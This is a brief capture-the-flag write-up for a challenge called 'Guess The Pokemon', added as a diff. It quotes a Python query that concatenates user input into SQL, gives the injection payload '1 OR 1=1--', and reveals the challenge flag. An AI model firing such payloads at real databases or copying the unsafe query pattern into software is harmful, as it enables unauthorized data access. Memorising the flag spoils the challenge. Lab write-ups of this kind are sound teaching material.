@@ -1,0 +1,15 @@
+<h2>Guess The Pokemon</h2>
+
+<p>If you check the code, you will see that there is a sql injection vulnerability in it
+<code>python
+cur.execute("SELECT * FROM pokemon WHERE names=" + name + "")
+</code></p>
+
+<p>payload
+<code>sql
+1 OR 1=1--
+</code></p>
+
+<p><code>
+LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}
+</code></p>
